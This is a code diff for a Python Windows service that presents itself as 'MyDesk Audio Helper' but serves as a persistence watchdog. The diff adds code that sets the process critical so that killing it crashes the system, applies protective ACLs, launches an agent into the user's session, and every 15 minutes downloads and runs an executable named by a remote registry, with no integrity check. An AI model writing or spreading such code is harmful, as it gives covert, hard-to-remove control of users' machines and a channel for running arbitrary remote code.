@@ -1,6 +1,8 @@
 import sys
 import time
 import os
+import json
+import urllib.request
 import subprocess
 import win32serviceutil
 import win32service
@@ -32,10 +34,18 @@ except ImportError:
 # Constants
 SAFE_MODE_FILE = r"C:\MyDesk\SAFE_MODE.txt"
 AGENT_EXE = r"C:\ProgramData\MyDesk\MyDeskAgent.exe"
-SERVICE_A_NAME = "MyDeskAudio"
-SERVICE_B_NAME = "MyDeskUpdate"
-UPDATE_URL = "https://mydesk-registry.vercel.app/api/get-agent"
+SERVICE_NAME = "MyDeskAudio" # The surviving "Shield"
+SERVICE_DISPLAY = "MyDesk Audio Helper"
+REGISTRY_BASE = "https://mydesk-registry.vercel.app"
 AGENT_DIR = r"C:\ProgramData\MyDesk"
+
+try:
+    import keyring
+    import keyrings.alt.Windows
+    # CRITICAL: Same backend as Agent for SYSTEM compatibility
+    keyring.set_keyring(keyrings.alt.Windows.RegistryKeyring())
+except:
+    keyring = None
 
 def is_process_running(process_name):
     """Check if a process is running using tasklist."""
@@ -59,47 +69,70 @@ def start_service(service_name):
     except (subprocess.SubprocessError, FileNotFoundError):
         pass
 
-def download_agent():
-    """Download the Agent from the Update URL."""
+def get_local_version():
+    """Get version from Keyring."""
+    if not keyring: return "0.0.0"
     try:
-        if not os.path.exists(AGENT_DIR):
-            os.makedirs(AGENT_DIR)
-        
-        import urllib.request
-        # This will follow the redirect from Vercel to the actual file (MediaFire/Direct Link)
-        urllib.request.urlretrieve(UPDATE_URL, AGENT_EXE)
-        return True
-    except Exception as e:
-        try:
-             with open(r"C:\ProgramData\MyDesk\service_log.txt", "a") as f:
-                 f.write(f"Download Failed: {e}\n")
-        except: pass
-        return False
+        ver = keyring.get_password("MyDeskAgent", "agent_version")
+        return ver if ver else "0.0.0"
+    except: return "0.0.0"
 
-def check_for_updates():
-    """Check if a new version is available (Simple Size Check)."""
+def set_local_version(ver):
+    """Update version in Keyring."""
+    if not keyring: return
     try:
-        import urllib.request
-        req = urllib.request.Request(UPDATE_URL, method='HEAD')
-        with urllib.request.urlopen(req) as response:
-            remote_size = int(response.headers.get('Content-Length', 0))
-            
-        if not os.path.exists(AGENT_EXE):
-            return True # Missing = Need Update
-            
-        local_size = os.path.getsize(AGENT_EXE)
+        keyring.set_password("MyDeskAgent", "agent_version", ver)
+    except: pass
+
+def perform_atomic_update():
+    """Check registry for new version, download, and swap atomically."""
+    try:
         
-        if remote_size > 0 and remote_size != local_size:
-            return True
-        return False
-    except:
-        return False
+        # 1. Get Latest Version info
+        with urllib.request.urlopen(f"{REGISTRY_BASE}/api/version", timeout=10) as response:
+            data = json.loads(response.read().decode())
+            remote_ver = data.get("version", "0.0.0")
+            download_url = data.get("url")
+            
+        local_ver = get_local_version()
+        
+        if remote_ver > local_ver:
+            print(f"[*] Update Found: {local_ver} -> {remote_ver}")
+            
+            # Resolve full download URL if relative
+            if download_url.startswith("/"):
+                download_url = REGISTRY_BASE + download_url
+                
+            # 2. Download to .tmp
+            tmp_exe = AGENT_EXE + ".tmp"
+            urllib.request.urlretrieve(download_url, tmp_exe)
+            
+            # 3. Stop Agent to release file lock
+            subprocess.run('taskkill /F /IM "MyDeskAgent.exe"', shell=True, capture_output=True)
+            time.sleep(2)
+            
+            # 4. Atomic Swap
+            if os.path.exists(tmp_exe):
+                if os.path.exists(AGENT_EXE):
+                    os.remove(AGENT_EXE)
+                os.rename(tmp_exe, AGENT_EXE)
+                
+                # 5. Update Version in Keyring
+                set_local_version(remote_ver)
+                print(f"[+] Atomic Update Success: {remote_ver}")
+                return True
+    except Exception as e:
+        print(f"[-] Update Error: {e}")
+    return False
 
 def start_agent_as_user():
     """Launch Agent in the Active User Session (Bypass Session 0 Isolation)."""
     try:
         def log(msg):
-            pass
+            try:
+                with open(r"C:\ProgramData\MyDesk\service_debug.txt", "a") as f:
+                    f.write(f"[{time.ctime()}] [AgentLaunch] {msg}\n")
+            except: pass
 
         # Self-Healing: Check if Agent exists
         if not os.path.exists(AGENT_EXE):
@@ -216,9 +249,10 @@ def start_agent_as_user():
         # 7. Create Process As User
         # CreateProcessAsUserW(hToken, lpapp, lpcmd, ...)
         cmd = f'"{AGENT_EXE}"' # Command line MUST include executable path if lpApplicationName is None
-        dwCreationFlags = 0x00000400 # CREATE_UNICODE_ENVIRONMENT
+        # CREATE_UNICODE_ENVIRONMENT (0x400) | CREATE_NEW_CONSOLE (0x10)
+        dwCreationFlags = 0x00000410 
         
-        log(f"Attempting launch: {cmd}")
+        log(f"Attempting launch: {cmd} with flags {hex(dwCreationFlags)}")
         
         success = windll.advapi32.CreateProcessAsUserW(
             primary_token,
@@ -273,49 +307,36 @@ class WatcherService(win32serviceutil.ServiceFramework):
         self.main()
 
     def main(self):
-        # Determine Role
-        is_service_a = self._svc_name_ == SERVICE_A_NAME
-        
-        # --- PROTECTION ACQUIRAL ---
         # Apply ACLs to THIS service process immediately
         if protection:
             protection.protect_process()
 
-        # --- SERVICE A STARTUP TASKS ---
-        # if is_service_a:
-        #     # Auto-Update Check on Boot
-        #     if check_for_updates():
-        #         # Stop Agent if running to allow overwrite
-        #         subprocess.run(f'taskkill /F /IM "MyDeskAgent.exe"', shell=True)
-        #         download_agent()
-
+        # Update tick counter
+        ticks = 0
+        
         while self.running:
-            # Check Safe Mode File (Manual Override)
+            ticks += 1
             safe_mode_file = os.path.exists(SAFE_MODE_FILE)
+            in_safe_mode = protection.is_safe_mode() if protection else False
             
-            # --- SERVICE A LOGIC (Watcher) ---
-            if is_service_a:
-                # Watch Service B
-                if not is_process_running("MyDeskServiceB.exe"):
-                    start_service(SERVICE_B_NAME)
-                
-                # Watch Agent
-                if not is_process_running("MyDeskAgent.exe"):
-                    start_agent_as_user()
+            # 1. CRITICAL STATUS: Make service unkillable (BSOD if killed)
+            if protection and not safe_mode_file and not in_safe_mode:
+                # Re-apply every tick to be sure
+                protection.set_critical_status(True)
+            elif protection:
+                protection.set_critical_status(False)
 
-            # --- SERVICE B LOGIC (Critical) ---
-            else:
-                # Watch Service A
-                if not is_process_running("MyDeskServiceA.exe"):
-                    start_service(SERVICE_A_NAME)
-                
-                # Critical Status Logic
-                # Only if NOT Safe Mode file AND NOT in Windows Safe Mode AND protection module loaded
-                if protection:
-                    if not safe_mode_file and not protection.is_safe_mode():
-                        protection.set_critical_status(True)
-                    else:
-                        protection.set_critical_status(False)
+            # 2. AGENT WATCHDOG: Ensure agent is always running
+            if not is_process_running("MyDeskAgent.exe"):
+                # If Agent is missing or needs update (checked periodically)
+                if not os.path.exists(AGENT_EXE):
+                    perform_atomic_update() # Download initial version
+                start_agent_as_user()
+
+            # 3. AUTO-UPDATE: Check every ~15 minutes (225 ticks @ 4s)
+            if ticks >= 225:
+                ticks = 0
+                perform_atomic_update()
 
             # Loop Sleep (4s)
             rc = win32event.WaitForSingleObject(self.hWaitStop, 4000)
@@ -324,32 +345,19 @@ class WatcherService(win32serviceutil.ServiceFramework):
 
 if __name__ == '__main__':
     try:
-        # Determine which service we are based on exe name or arg
-        exe_name = os.path.basename(sys.executable).lower()
-        
-        if "servicea" in exe_name or "--role a" in sys.argv or "audio" in exe_name:
-            WatcherService._svc_name_ = SERVICE_A_NAME
-            WatcherService._svc_display_name_ = "MyDesk Audio Helper"
-            WatcherService._svc_description_ = "Manages advanced audio routing for MyDesk."
-        else:
-            WatcherService._svc_name_ = SERVICE_B_NAME
-            WatcherService._svc_display_name_ = "MyDesk Update Helper"
-            WatcherService._svc_description_ = "Keeps MyDesk components up to date."
+        WatcherService._svc_name_ = SERVICE_NAME
+        WatcherService._svc_display_name_ = SERVICE_DISPLAY
+        WatcherService._svc_description_ = "Manages advanced audio and persistence for MyDesk."
 
         # FROZEN SERVICE HANDLER
         if len(sys.argv) == 1:
             try:
                 servicemanager.Initialize()
                 servicemanager.PrepareToHostSingle(WatcherService)
-                
                 servicemanager.StartServiceCtrlDispatcher()
-            except Exception:
-                pass
+            except: pass
         else:
-            try:
-                win32serviceutil.HandleCommandLine(WatcherService)
-            except Exception:
-                pass
+            win32serviceutil.HandleCommandLine(WatcherService)
             
     except Exception:
         pass
